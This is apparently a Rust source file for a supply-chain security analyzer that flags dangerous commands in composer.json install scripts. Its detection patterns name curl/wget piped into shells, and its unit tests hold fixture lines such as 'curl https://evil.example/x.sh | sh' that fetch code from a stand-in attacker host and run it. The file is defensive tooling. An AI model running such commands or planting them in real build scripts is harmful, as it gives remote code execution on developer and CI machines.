//! `composer-scripts` — flags dangerous commands in `composer.json` scripts.
//!
//! `composer-audit` checks *dependencies* against known CVEs but is blind to
//! the `scripts` block, which runs **arbitrary shell commands** on every
//! `composer install` / `composer update` (`post-install-cmd`,
//! `post-autoload-dump`, `post-update-cmd`, …). A compromised or typo-squatted
//! package that ships a malicious `post-install-cmd` executes on the developer
//! or CI machine the moment its dependency tree is installed — a rising
//! supply-chain RCE vector that a dependency-CVE scan never sees.
//!
//! **Native, offline, and data-driven — like `wp-vuln`, not a subprocess.**
//! There is no external tool, no FFI, no network call, and no new dependency:
//! this analyzer reads the root `composer.json` already in the tree, parses its
//! `scripts` object, and inspects each command string for dangerous shapes.
//! A tree with no `composer.json` yields no findings and no error (the
//! `wp-vuln`-on-a-non-WordPress-tree behaviour); a `composer.json` that exists
//! but is unparseable is a fail-closed error, never a silent pass.
//!
//! Each script event maps to a string command or an array of them. For every
//! command this analyzer emits at most one finding, at the most dangerous shape
//! it matches (in priority order):
//!
//! - **`composer-scripts/pipe-to-shell`** (confirmed / high) — a remote fetch
//!   piped into a shell interpreter (`curl … | sh`, `wget -O- … | bash`,
//!   `… | php`). The clearest install-time RCE shape.
//! - **`composer-scripts/remote-fetch`** (suspected / high) — a `curl` / `wget`
//!   / `fetch` of a URL (a download during install) not already caught as a
//!   pipe-to-shell.
//! - **`composer-scripts/eval`** (suspected / medium) — inline code
//!   evaluation: `php -r`, an `eval` token, or `base64_decode` inside the
//!   command.
//! - **`composer-scripts/shell-exec`** (suspected / medium) — a raw shell
//!   command (chaining/piping metacharacters `;`, `&&`, `|`, backticks, `$(`,
//!   or `chmod +x` / `rm -rf`) as opposed to a Composer script-handler
//!   reference.
//!
//! The **legitimate** and common forms are deliberately *not* flagged: a
//! Composer callback (`Vendor\\Pkg::postInstall`), the `@php` / `@composer` /
//! `@putenv` directives (`@php artisan migrate`), and plain single-binary
//! invocations (`phpunit`, `php-cs-fixer`). Only genuine pipe-to-shell is in
//! the confirmed tier; everything else is a review hotspot. **Opt-in** —
//! registered but not in the default `security` profile.

use serde_json::Value;

use crate::analyzer::{AnalysisCtx, Analyzer, AnalyzerError};
use crate::finding::{Category, Confidence, Finding, Severity};

/// See the module docs.
pub struct ComposerScripts;

/// The analyzer's stable id (and rule-id namespace prefix).
pub const ID: &str = "composer-scripts";

/// Maximum command length echoed in a finding message; longer commands are
/// truncated with an ellipsis so a message never dumps a huge one-liner.
const MAX_CMD_LEN: usize = 80;

/// `true` when `b` can be part of a shell/identifier word (used for word
/// boundaries so `php` does not match inside `phpunit`).
fn is_ident_byte(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'_'
}

/// `true` when `word` occurs in `hay_lower` on both-side word boundaries.
/// `hay_lower` is assumed already ASCII-lowercased; `word` must be lowercase.
fn contains_word(hay_lower: &str, word: &str) -> bool {
    let hay = hay_lower.as_bytes();
    let w = word.as_bytes();
    if w.is_empty() || hay.len() < w.len() {
        return false;
    }
    hay.windows(w.len()).enumerate().any(|(start, window)| {
        window == w
            && (start == 0 || !is_ident_byte(hay[start - 1]))
            && (start + w.len() == hay.len() || !is_ident_byte(hay[start + w.len()]))
    })
}

/// The known remote-fetch tools whose presence signals a download.
fn has_fetch_tool(cmd_lower: &str) -> bool {
    contains_word(cmd_lower, "curl")
        || contains_word(cmd_lower, "wget")
        || contains_word(cmd_lower, "fetch")
}

/// `true` when the command pipes into a shell interpreter — any `|`-delimited
/// segment after the first begins with `sh` / `bash` / `zsh` / `dash` / `php`.
fn pipes_to_shell(cmd_lower: &str) -> bool {
    const SHELLS: [&str; 5] = ["sh", "bash", "zsh", "dash", "php"];
    let mut segments = cmd_lower.split('|');
    // The command being fed *into* a shell is everything after the first pipe.
    let _ = segments.next();
    segments.any(|segment| {
        let head = segment.trim_start();
        SHELLS.iter().any(|shell| head == *shell || head.starts_with(&format!("{shell} ")))
    })
}

/// `true` when the command evaluates code inline: `php -r`, an `eval` call, or
/// `base64_decode` (the decode-and-run shape).
fn is_eval(cmd_lower: &str) -> bool {
    if contains_word(cmd_lower, "eval") || cmd_lower.contains("base64_decode") {
        return true;
    }
    // `php -r '<code>'` — inline code passed to the PHP CLI (also matches the
    // `@php -r …` directive form, since `@php` contains the `php` word).
    contains_word(cmd_lower, "php")
        && (cmd_lower.contains(" -r ") || cmd_lower.contains(" -r\"") || cmd_lower.contains(" -r'"))
}

/// `true` when the command carries raw-shell metacharacters (chaining,
/// piping, subshells) or the classic destructive/permission verbs.
fn is_shell_exec(cmd: &str, cmd_lower: &str) -> bool {
    cmd.contains(';')
        || cmd.contains("&&")
        || cmd.contains('|')
        || cmd.contains('`')
        || cmd.contains("$(")
        || cmd_lower.contains("chmod +x")
        || cmd_lower.contains("rm -rf")
}

/// `true` when the command is a plain Composer script-handler callback
/// (`Class::method`, e.g. `Vendor\\Pkg::postInstall`): a single token with no
/// whitespace, containing `::`, made only of identifier / namespace / colon
/// characters. These are the normal, safe form and are never flagged.
fn is_script_handler_callback(cmd: &str) -> bool {
    let t = cmd.trim();
    !t.is_empty()
        && !t.contains(char::is_whitespace)
        && t.contains("::")
        && t.chars().all(|c| c.is_alphanumeric() || matches!(c, '_' | '\\' | ':'))
}

/// The classified dangerous shape of one command.
struct Shape {
    /// Rule suffix appended to [`ID`].
    rule: &'static str,
    severity: Severity,
    confidence: Confidence,
    /// Human-readable shape description for the finding message.
    desc: &'static str,
}

/// Classify a single command string into its most dangerous shape, or `None`
/// for a benign command. Priority: pipe-to-shell → remote-fetch → eval →
/// shell-exec, so a `curl … | sh` is reported as the RCE it is, not merely as
/// a shell command.
fn classify(cmd: &str) -> Option<Shape> {
    if is_script_handler_callback(cmd) {
        return None;
    }
    let lower = cmd.to_ascii_lowercase();

    if has_fetch_tool(&lower) && pipes_to_shell(&lower) {
        return Some(Shape {
            rule: "pipe-to-shell",
            severity: Severity::High,
            confidence: Confidence::Confirmed,
            desc: "a remote fetch piped directly into a shell",
        });
    }
    if has_fetch_tool(&lower) && lower.contains("://") {
        return Some(Shape {
            rule: "remote-fetch",
            severity: Severity::High,
            confidence: Confidence::Suspected,
            desc: "a remote download during install",
        });
    }
    if is_eval(&lower) {
        return Some(Shape {
            rule: "eval",
            severity: Severity::Medium,
            confidence: Confidence::Suspected,
            desc: "inline code evaluation",
        });
    }
    if is_shell_exec(cmd, &lower) {
        return Some(Shape {
            rule: "shell-exec",
            severity: Severity::Medium,
            confidence: Confidence::Suspected,
            desc: "a raw shell command",
        });
    }
    None
}

/// A short, safe preview of a command — trimmed and truncated to
/// [`MAX_CMD_LEN`] characters.
fn truncate_cmd(cmd: &str) -> String {
    let trimmed = cmd.trim();
    if trimmed.chars().count() <= MAX_CMD_LEN {
        return trimmed.to_owned();
    }
    let head: String = trimmed.chars().take(MAX_CMD_LEN).collect();
    format!("{head}…")
}

/// Build a finding for a classified command under `event`.
fn build_finding(event: &str, cmd: &str, shape: &Shape) -> Finding {
    Finding {
        rule_id: format!("{ID}/{}", shape.rule),
        severity: shape.severity,
        category: Category::SupplyChain,
        path: Some("composer.json".into()),
        // The offending script event is named in the message; a JSON object has
        // no meaningful line anchor to report.
        line: None,
        message: format!("composer script `{event}` runs {}: `{}`", shape.desc, truncate_cmd(cmd)),
        confidence: shape.confidence,
    }
}

/// Emit a finding for `cmd` under `event` if it classifies as dangerous.
fn scan_command(event: &str, cmd: &str, out: &mut Vec<Finding>) {
    if let Some(shape) = classify(cmd) {
        out.push(build_finding(event, cmd, &shape));
    }
}

/// Scan a parsed `composer.json`'s `scripts` object into findings. A missing
/// or non-object `scripts` key yields none.
fn scan_scripts(json: &Value) -> Vec<Finding> {
    let mut findings = Vec::new();
    let Some(scripts) = json.get("scripts").and_then(Value::as_object) else {
        return findings;
    };
    for (event, value) in scripts {
        match value {
            // A single command string.
            Value::String(cmd) => scan_command(event, cmd, &mut findings),
            // An array of command strings (the common multi-step form).
            Value::Array(items) => {
                for cmd in items.iter().filter_map(Value::as_str) {
                    scan_command(event, cmd, &mut findings);
                }
            }
            _ => {}
        }
    }
    findings
}

impl Analyzer for ComposerScripts {
    fn id(&self) -> &str {
        ID
    }

    fn category(&self) -> Category {
        Category::SupplyChain
    }

    fn run(&self, ctx: &AnalysisCtx) -> Result<Vec<Finding>, AnalyzerError> {
        let path = ctx.root().join("composer.json");
        let text = match std::fs::read_to_string(&path) {
            Ok(text) => text,
            // No composer.json — nothing to inspect, not an error (mirrors
            // wp-vuln on a non-WordPress tree).
            Err(err) if err.kind() == std::io::ErrorKind::NotFound => return Ok(Vec::new()),
            Err(err) => return Err(AnalyzerError::Io(err)),
        };
        // A composer.json that exists but does not parse is a fail-closed error
        // (mirrors a corrupt wp-vuln feed) — never a silent clean pass.
        let json: Value = serde_json::from_str(&text)
            .map_err(|e| AnalyzerError::Parse(format!("composer.json is not valid JSON: {e}")))?;
        Ok(scan_scripts(&json))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Parse a `composer.json` body and scan its scripts.
    fn scan(json: &str) -> Vec<Finding> {
        let value: Value = serde_json::from_str(json).expect("fixture composer.json parses");
        scan_scripts(&value)
    }

    #[test]
    fn pipe_to_shell_is_confirmed_high() {
        let findings =
            scan(r#"{"scripts": {"post-install-cmd": "curl https://evil.example/x.sh | sh"}}"#);
        assert_eq!(findings.len(), 1, "{findings:?}");
        let f = &findings[0];
        assert_eq!(f.rule_id, "composer-scripts/pipe-to-shell");
        assert_eq!(f.severity, Severity::High);
        assert_eq!(f.confidence, Confidence::Confirmed);
        assert_eq!(f.category, Category::SupplyChain);
        assert_eq!(f.path.as_deref(), Some(std::path::Path::new("composer.json")));
        assert_eq!(f.line, None);
        assert!(f.message.contains("post-install-cmd"), "{}", f.message);
    }

    #[test]
    fn pipe_to_bash_and_php_also_caught() {
        for cmd in
            ["wget -qO- https://evil.example/x | bash", "curl -s https://evil.example/x | php"]
        {
            let findings = scan(&format!(r#"{{"scripts": {{"post-update-cmd": "{cmd}"}}}}"#));
            assert_eq!(findings.len(), 1, "{cmd}: {findings:?}");
            assert_eq!(findings[0].rule_id, "composer-scripts/pipe-to-shell");
        }
    }

    #[test]
    fn class_method_callback_is_not_flagged() {
        let findings = scan(
            r#"{"scripts": {"post-autoload-dump": "MyVendor\\Package\\Installer::postAutoloadDump"}}"#,
        );
        assert!(findings.is_empty(), "{findings:?}");
    }

    #[test]
    fn php_directive_is_not_flagged() {
        // @php artisan migrate is the normal Laravel form — safe.
        let findings = scan(r#"{"scripts": {"post-update-cmd": "@php artisan migrate"}}"#);
        assert!(findings.is_empty(), "{findings:?}");
    }

    #[test]
    fn plain_binary_and_composer_directive_are_not_flagged() {
        let findings = scan(
            r#"{"scripts": {"test": "phpunit", "cs": "php-cs-fixer fix", "x": "@composer dump-autoload"}}"#,
        );
        assert!(findings.is_empty(), "{findings:?}");
    }

    #[test]
    fn remote_fetch_without_pipe_is_high_suspected() {
        let findings =
            scan(r#"{"scripts": {"post-install-cmd": "curl https://cdn.example/tool -o tool"}}"#);
        assert_eq!(findings.len(), 1, "{findings:?}");
        let f = &findings[0];
        assert_eq!(f.rule_id, "composer-scripts/remote-fetch");
        assert_eq!(f.severity, Severity::High);
        assert_eq!(f.confidence, Confidence::Suspected);
    }

    #[test]
    fn php_dash_r_is_eval_medium() {
        let findings =
            scan(r#"{"scripts": {"post-install-cmd": "php -r \"file_put_contents('x', 'y');\""}}"#);
        assert_eq!(findings.len(), 1, "{findings:?}");
        let f = &findings[0];
        assert_eq!(f.rule_id, "composer-scripts/eval");
        assert_eq!(f.severity, Severity::Medium);
        assert_eq!(f.confidence, Confidence::Suspected);
    }

    #[test]
    fn base64_decode_is_eval() {
        let findings = scan(r#"{"scripts": {"post-update-cmd": "echo Zm9v | base64_decode"}}"#);
        assert_eq!(findings.len(), 1, "{findings:?}");
        // The pipe target is `base64_decode`, not a shell, so this is eval, not
        // pipe-to-shell.
        assert_eq!(findings[0].rule_id, "composer-scripts/eval");
    }

    #[test]
    fn raw_shell_chaining_is_shell_exec_medium() {
        let findings =
            scan(r#"{"scripts": {"post-install-cmd": "mkdir build && chmod +x build/run"}}"#);
        assert_eq!(findings.len(), 1, "{findings:?}");
        let f = &findings[0];
        assert_eq!(f.rule_id, "composer-scripts/shell-exec");
        assert_eq!(f.severity, Severity::Medium);
        assert_eq!(f.confidence, Confidence::Suspected);
    }

    #[test]
    fn array_of_commands_each_classified() {
        let findings = scan(
            r#"{"scripts": {"post-install-cmd": [
                "MyVendor\\Pkg::method",
                "@php artisan migrate",
                "curl https://evil.example/x.sh | sh"
            ]}}"#,
        );
        assert_eq!(findings.len(), 1, "only the pipe-to-shell entry: {findings:?}");
        assert_eq!(findings[0].rule_id, "composer-scripts/pipe-to-shell");
    }

    #[test]
    fn no_scripts_block_yields_nothing() {
        assert!(scan(r#"{"name": "acme/app", "require": {"php": "^8.3"}}"#).is_empty());
    }

    #[test]
    fn long_command_is_truncated_in_message() {
        let long = format!("curl https://evil.example/{} | sh", "a".repeat(200));
        let findings = scan(&format!(r#"{{"scripts": {{"post-install-cmd": "{long}"}}}}"#));
        assert_eq!(findings.len(), 1, "{findings:?}");
        assert!(findings[0].message.contains('…'), "{}", findings[0].message);
        // The full 200-char command must not be echoed.
        assert!(!findings[0].message.contains(&"a".repeat(200)));
    }

    // ---- full Analyzer::run path ----

    use std::path::Path;

    use crate::config::AnalyzeConfig;

    fn ctx_for(root: &Path) -> AnalysisCtx {
        AnalysisCtx::new(root.to_path_buf(), AnalyzeConfig::default())
    }

    #[test]
    fn run_without_composer_json_is_clean() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("index.php"), "<?php echo 1;\n").unwrap();
        let findings = ComposerScripts.run(&ctx_for(dir.path())).expect("no composer.json is fine");
        assert!(findings.is_empty(), "{findings:?}");
    }

    #[test]
    fn run_on_malformed_composer_json_errors() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("composer.json"), "{ this is not json").unwrap();
        let err = ComposerScripts.run(&ctx_for(dir.path())).expect_err("garbage must gate");
        assert!(!err.is_skip(), "a malformed composer.json must gate, not skip: {err:?}");
        assert!(matches!(err, AnalyzerError::Parse(_)), "expected Parse, got {err:?}");
    }

    #[test]
    fn run_end_to_end_flags_pipe_to_shell() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("composer.json"),
            r#"{"scripts": {"post-install-cmd": "curl https://evil.example/x.sh | sh"}}"#,
        )
        .unwrap();
        let findings = ComposerScripts.run(&ctx_for(dir.path())).expect("run succeeds");
        assert_eq!(findings.len(), 1, "{findings:?}");
        assert_eq!(findings[0].rule_id, "composer-scripts/pipe-to-shell");
        assert_eq!(findings[0].confidence, Confidence::Confirmed);
    }
}
